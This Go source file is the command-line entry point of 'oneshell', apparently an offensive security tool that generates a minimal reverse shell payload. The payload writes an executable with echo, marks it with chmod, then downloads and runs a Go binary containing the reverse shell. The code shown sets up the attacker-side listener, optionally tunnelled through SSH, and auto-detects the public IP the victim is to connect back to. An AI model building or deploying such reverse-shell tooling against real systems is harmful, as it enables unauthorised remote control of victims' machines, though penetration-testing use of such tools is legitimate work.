package cmd

import (
	"log"
	"net"
	"os"

	"github.com/spf13/cobra"
	"github.com/tantosec/oneshell/pkg"
	"golang.org/x/crypto/ssh"
)

var rootCmd = &cobra.Command{
	Use:   "oneshell",
	Short: "Generate a revshell payload using only echo, chmod, and the /tmp directory",
	Long: `Generate a reverse shell payload that requires minimal tools on the target environment.
Specifically, the payload will use the shell's echo command to create an executable file,
use the chmod binary to make it executable, and execute it. From here it will download
additional code allowing the program to download a Golang binary containing the reverse shell.`,
	Run: func(cmd *cobra.Command, args []string) {
		port, err := cmd.Flags().GetUint16("port")
		if err != nil {
			log.Fatal(err)
		}

		sshHost, err := cmd.Flags().GetString("ssh")
		if err != nil {
			log.Fatal(err)
		}

		target, err := cmd.Flags().GetString("target")
		if err != nil {
			log.Fatal(err)
		}

		bypassSanityCheck, err := cmd.Flags().GetBool("bypass-ssh-sanity-check")
		if err != nil {
			log.Fatal(err)
		}

		var sshConn *ssh.Client = nil

		dialer := net.Dial

		if sshHost != "" {
			sshConn, err = pkg.ConnectToSSHHost(sshHost, port, bypassSanityCheck)
			if err != nil {
				log.Fatal(err)
			}
			dialer = sshConn.Dial
		}

		if target == "" {
			target, err = pkg.GetIPUsingDialer(dialer)
			if err != nil {
				log.Fatalf("failed to automatically detect IP: %v", err)
			}
			log.Println("Target unspecified, using public IP:", target)
		}

		listener := pkg.Listener{
			Listen: net.Listen,
			Port:   port,
		}

		if sshConn != nil {
			listener.Listen = sshConn.Listen
		}

		err = pkg.Listen(listener, target)
		if err != nil {
			log.Fatalf("error occurred when listening: %v", err)
		}
	},
}

func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	rootCmd.Flags().StringP("target", "t", "", "Target IP/hostname for the victim to connect to (this machine). If left blank, will try and identify public IP automatically")
	rootCmd.Flags().Uint16P("port", "p", 9001, "Port to listen on")
	rootCmd.Flags().StringP("ssh", "s", "", "Name of SSH config file entry. If specified will listen on <port> on the remote machine instead of the local port")
	rootCmd.Flags().Bool("bypass-ssh-sanity-check", false, "Bypass the test connection to the SSH machine to check if the SSH port forward works")
}
